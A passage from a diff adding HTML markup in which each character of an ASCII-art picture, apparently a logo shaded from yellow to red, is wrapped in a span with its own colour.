style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F5BE36;">*</span><span style="color:#F5BC36;">*</span><span style="color:#F5B935;">*</span><span style="color:#F5B734;">*</span><span style="color:#F5B634;">*</span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F6AD32;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#ED8E2C;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F77222;">/</span><span style="color:#F36D22;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#05004C;">&amp;</span><span style="color:#F85F1D;">(</span><span style="color:#F85D1C;">(</span><span style="color:#F85A1C;">(</span><span style="color:#F8591B;">(</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#F95019;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#F94716;">(</span><span style="color:#F44417;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#E33B1A;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#F93B13;">(</span><span style="color:#F93813;">(</span><span style="color:#F93612;">(</span><span style="color:#F93411;">(</span><span style="color:#F93211;">(</span><span style="color:#FA3010;">(</span><span style="color:#FA2E10;">(</span><span style="color:#FA2B0F;">(</span><span style="color:#FA2A0F;">(</span><span style="color:#FA280E;">#</span><span style="color:#FA250D;">#</span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#868B97;">/</span><span style="color:#FFFFFF;"> </span><span style="color:#F7C037;">*</span><span style="color:#F7BE37;">*</span><span style="color:#F7BB36;">*</span><span style="color:#F7B935;">*</span><span style="color:#F7B835;">*</span><span style="color:#F7B534;">*</span><span style="color:#F7B334;">*</span><span style="color:#F8B133;">*</span><span style="color:#C08638;">(</span><span style="color:#593B42;">%</span><span style="color:#412A45;">%</span><span style="color:#B67B38;">(</span><span style="color:#F8A630;">*</span><span style="color:#F8A430;">*</span><span style="color:#F8A22F;">/</span><span style="color:#F89F2F;">/</span><span style="color:#F89E2E;">/</span><span style="color:#05004C;">&amp;</span><span style="color:#190C49;">&amp;</span><span style="color:#F8972C;">/</span><span style="color:#F8952C;">/</span><span style="color:#F8932B;">/</span><span style="color:#F9912B;">/</span><span style="color:#F98F2A;">/</span><span style="color:#05004C;">&amp;</span><span style="color:#F98A29;">/</span><span style="color:#F98928;">/</span><span style="color:#210F48;">&amp;</span><span style="color:#05004C;">&amp;</span><span style="color:#05004C;">&amp;</span><span style="color:#05004C;">&amp;</span><span style="color:#05004C;">&amp;</span><span style="color:#2D1445;">&amp;</span><span style="color:#F97924;">/</span><span style="color:#F97724;">/</span><span style="color:#F97523;">/</span><span style="color:#05004C;">&amp;</span><span style="color:#FA7022;">/</span><span style="color:#FA6F22;">/</span><span style="color:#FA6D21;">/</span><span style="color:#FA6A20;">/</span><span style="color:#FA6820;">/</span><span style="color:#FA661F;">/</span><span style="color:#FA641F;">(</span><span style="color:#FA621E;">(</span><span style="color:#05004C;">&amp;</span><span style="color:#321143;">&amp;</span><span style="color:#FA5B1D;">(</span><span style="color:#FA5A1C;">(</span><span style="color:#FA571B;">(</span><span style="color:#FA551B;">(</span><span style="color:#FA531A;">(</span><span style="color:#9F332C;">#</span><span style="color:#05004C;">&amp;</span><span style="color:#05004C;">&amp;</span><span style="color:#FB4A18;">(</span><span style="color:#FB4817;">(</span><span style="color:#FB4617;">(</span><span style="color:#FB4416;">(</span><span style="color:#FB4216;">(</span><span style="color:#FB3F15;">(</span><span style="color:#FB3E15;">(</span><span style="color:#FB3B14;">(</span><span style="color:#FB3913;">(</span><span style="color:#FB3713;">(</span><span style="color:#FB3512;">(</span><span style="color:#FB3312;">(</span><span style="color:#FC3011;">(</span><span style="color:#FC2E11;">(</span><span style="color:#FC2C10;">(</span><span style="color:#FC2B10;">(</span><span style="color:#FC280F;">(</span><span style="color:#FC260E;">#</span><span style="color:#FC240E;">#</span><span style="color:#FFFFFF;"> </span><span style="color:#FFFFFF;"> </span>
+	<span style="color:#C5C8CD;">,</span><span style="color:#FDFDFD;"> </span><span style="color:#F5BE36;">*</span><span style="color:#F5BC36;">*</span><span style="color:#04004B;">&amp;</span><span style="color:#F5B734;">*</span><span style="color:#F5B634;">*</span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F6AD32;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#2C1946;">&amp;</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F6932B;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#EF872A;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#1D0C47;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#F77222;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#F95019;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#F94716;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#F93B13;">(</span><span style="color:#F93813;">(</span><span style="color:#F93612;">(</span><span style="color:#F93411;">(</span><span style="color:#F93211;">(</span><span style="color:#FA3010;">(</span><span style="color:#FA2E10;">(</span><span style="color:#FA2B0F;">(</span><span style="color:#C8211B;">#</span><span style="color:#FA280E;">#</span><span style="color:#FA250D;">#</span><span style="color:#FA230D;">#</span><span style="color:#FDFDFD;"> </span><span style="color:#F5F5F6;"> </span>
+	<span style="color:#B8BBC2;">,</span><span style="color:#FDFDFD;"> </span><span style="color:#F5BE36;">*</span><span style="color:#F5BC36;">*</span><span style="color:#F5B935;">*</span><span style="color:#F5B734;">*</span><span style="color:#F7B835;">*</span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F6AD32;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F8952C;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#05004C;">&amp;</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#5D233A;">%</span><span style="color:#F85D1C;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#4C1A3D;">%</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#FB511A;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#F94716;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#F93B13;">(</span><span style="color:#F93813;">(</span><span style="color:#F93612;">(</span><span style="color:#F93411;">(</span><span style="color:#F93211;">(</span><span style="color:#FA3010;">(</span><span style="color:#FC2E11;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#FA2A0F;">(</span><span style="color:#FA280E;">#</span><span style="color:#FA250D;">#</span><span style="color:#FA230D;">#</span><span style="color:#FCE8E6;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F5BE36;">*</span><span style="color:#F5BC36;">*</span><span style="color:#F5B935;">*</span><span style="color:#F5B734;">*</span><span style="color:#F5B634;">*</span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F6AD32;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#DE8B30;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F6932B;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#E7822B;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F77222;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#5B273C;">%</span><span style="color:#04004B;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#AE462C;">#</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#F85D1C;">(</span><span style="color:#F85A1C;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#F95019;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#F94716;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#F93B13;">(</span><span style="color:#F93813;">(</span><span style="color:#F93612;">(</span><span style="color:#F93411;">(</span><span style="color:#F93211;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#FA2E10;">(</span><span style="color:#FA2B0F;">(</span><span style="color:#FA2A0F;">(</span><span style="color:#FA280E;">#</span><span style="color:#FA250D;">#</span><span style="color:#FB8C81;">*</span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FAFAFA;"> </span><span style="color:#FDEECB;"> </span><span style="color:#F5BC36;">*</span><span style="color:#F5B935;">*</span><span style="color:#F5B734;">*</span><span style="color:#F7B835;">*</span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F8AF33;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F89E2E;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F8952C;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#F98C29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F97B25;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#05004C;">&amp;</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#FA6A20;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#F85D1C;">(</span><span style="color:#F85A1C;">(</span><span style="color:#05004C;">&amp;</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#FB511A;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#FB4817;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#F93B13;">(</span><span style="color:#F93813;">(</span><span style="color:#05004C;">&amp;</span><span style="color:#621435;">%</span><span style="color:#F93211;">(</span><span style="color:#FA3010;">(</span><span style="color:#FC2E11;">(</span><span style="color:#FA2B0F;">(</span><span style="color:#FA2A0F;">(</span><span style="color:#FA2910;">(</span><span style="color:#FFFFFF;"> </span><span style="color:#F8F9F9;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F5BC37;">*</span><span style="color:#F5B935;">*</span><span style="color:#F5B734;">*</span><span style="color:#F5B634;">*</span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F6AD32;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#EE9E30;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#492C42;">%</span><span style="color:#F69A2D;">/</span><span style="color:#804E3B;">#</span><span style="color:#04004B;">&amp;</span><span style="color:#F6932B;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F77222;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#F85D1C;">(</span><span style="color:#E65320;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#F95019;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#F94716;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#05004C;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#F93B13;">(</span><span style="color:#F93813;">(</span><span style="color:#F93612;">(</span><span style="color:#F93411;">(</span><span style="color:#F93211;">(</span><span style="color:#FA3010;">(</span><span style="color:#FA2E10;">(</span><span style="color:#FA422A;">(</span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F5BC3C;">*</span><span style="color:#F5B734;">*</span><span style="color:#F7B835;">*</span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F6AD32;">*</span><span style="color:#F6AB31;">*</span><span style="color:#04004B;">&amp;</span><span style="color:#E89D32;">/</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F8952C;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#0F0649;">&amp;</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#DB6E29;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F97323;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#F85D1C;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#F8591B;">(</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#FB511A;">(</span><span style="color:#09014A;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#2F0C42;">&amp;</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#F93B13;">(</span><span style="color:#F93813;">(</span><span style="color:#F93612;">(</span><span style="color:#F93411;">(</span><span style="color:#F93211;">(</span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#E1E3E5;">.</span><span style="color:#FDFDFD;"> </span><span style="color:#F5B634;">*</span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#04004B;">&amp;</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F6932B;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#08014A;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#C34626;">#</span><span style="color:#F8591B;">(</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#F95019;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#F94716;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#F93B13;">(</span><span style="color:#F93E1A;">(</span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FBEED4;"> </span><span style="color:#F7B334;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F8AF33;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F8AA31;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F8A22F;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F89E2E;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F8992D;">/</span><span style="color:#F6952B;">/</span><span style="color:#F8952C;">/</span><span style="color:#F6912A;">/</span><span style="color:#F9912B;">/</span><span style="color:#61363E;">%</span><span style="color:#150949;">&amp;</span><span style="color:#F78828;">/</span><span style="color:#F98928;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F98026;">/</span><span style="color:#F77D25;">/</span><span style="color:#F97B25;">/</span><span style="color:#F77823;">/</span><span style="color:#F97724;">/</span><span style="color:#F77422;">/</span><span style="color:#F97323;">/</span><span style="color:#F86F21;">/</span><span style="color:#FA6F22;">/</span><span style="color:#0E0449;">&amp;</span><span style="color:#05004C;">&amp;</span><span style="color:#E45E23;">(</span><span style="color:#FA661F;">/</span><span style="color:#F8631E;">(</span><span style="color:#331243;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#FA5D1D;">(</span><span style="color:#F85A1C;">(</span><span style="color:#FA5A1C;">(</span><span style="color:#F8561A;">(</span><span style="color:#FA551B;">(</span><span style="color:#F85219;">(</span><span style="color:#FB511A;">(</span><span style="color:#F94E18;">(</span><span style="color:#FB4C18;">(</span><span style="color:#F94917;">(</span><span style="color:#FB4817;">(</span><span style="color:#F94516;">(</span><span style="color:#FB4416;">(</span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F6AD32;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F6932B;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F77222;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#181359;">&amp;</span><span style="color:#FB844E;">*</span><span style="color:#F99063;">*</span><span style="color:#F98E62;">*</span><span style="color:#FAA889;">,</span><span style="color:#FBCAB8;">.</span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#EAEBEC;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F8952C;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F97323;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#FDFDFD;"> </span><span style="color:#FCFCFC;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> 